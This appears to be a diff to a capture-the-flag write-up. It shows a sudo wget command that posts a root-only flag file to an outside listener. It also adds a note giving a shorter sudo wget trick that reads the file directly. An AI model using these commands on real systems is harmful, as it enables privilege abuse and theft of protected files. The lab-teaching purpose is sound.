@@ -231,3 +231,8 @@ Now we can get the flag, its name is likely root_flag.txt, considering the user 
 ```bash
 jessie@CorpOne:/usr/bin$ sudo /usr/bin/wget --post-file=/root/root_flag.txt -O /dev/null http://10.112.69.230:8000/
 ```
+
+![> [!NOTE]
+> Creating a listener was not necessary, the easiest way would have been to use this method, which prints the flag directly
+>
+> sudo wget -i /root/root_flag.txt]
